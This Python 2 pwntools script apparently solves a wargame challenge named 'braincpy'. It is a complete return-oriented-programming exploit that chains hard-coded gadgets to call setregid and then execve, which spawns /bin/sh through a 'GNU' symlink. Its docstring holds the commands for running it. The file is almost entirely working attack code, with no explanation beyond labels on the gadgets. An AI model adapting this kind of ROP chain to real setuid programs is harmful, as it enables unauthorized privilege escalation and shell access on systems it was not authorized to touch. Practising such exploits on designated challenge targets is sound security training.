from pwn import *

"""
ln -s /bin/sh GNU
export PATH=$PATH:$(pwd)
~/braincpy "`python solver.py`"
"""

TEST = 0xdeadbeef

fake_ebp = 0x8086c1c - 0x0a	# 0xffffffa0 (-0x60)
ret_addr = 0x80df815		# add esp, dword [ebp + 0x0a]; ret;
popeax_ret = 0x80beb89
popebx_ret = 0x80516cb
popecxebx_ret = 0x805ae16
negeax_ret = 0x8054e7f
setecx_ret = 0x80dbd67		# add ecx, dword [ebx + 0x0a]; ret;
popecx_ret = 0x80dbc2c
incecx_ret = 0x80e18ad
popedx_ret = 0x805adec
incedx_ret = 0x8052237
int_ret = 0x805b5c0		# int 0x80; ret;
pwn_uid_addr = 0x80ccef4 - 0x0a # 1032 + 2
GNU_addr = 0x8048120		# GNU

execve_num = 11
setreuid_num = 71		# setreuid : 70, setregid : 71

tc = lambda x: 0x100000000 - x	# two's complement negation

payload = ""

# setreuid (or setregid)
payload += p32(popeax_ret)
payload += p32(tc(setreuid_num))
payload += p32(negeax_ret)

payload += p32(popecxebx_ret)
payload += p32(0xfffffffe)
payload += p32(pwn_uid_addr)

payload += p32(setecx_ret)

payload += p32(popebx_ret)
payload += p32(0xffffffff)

payload += p32(int_ret)

# system
payload += p32(popebx_ret)
payload += p32(GNU_addr)

payload += p32(popeax_ret)
payload += p32(tc(execve_num))
payload += p32(negeax_ret)

payload += p32(popecx_ret)
payload += p32(0xffffffff)
payload += p32(incecx_ret)

payload += p32(popedx_ret)
payload += p32(0xffffffff)
payload += p32(incedx_ret)

payload += p32(int_ret)

# DUMMY
payload += "A" * (0x58 - len(payload))

# Set esp
payload += p32(fake_ebp)
payload += p32(ret_addr)

print payload

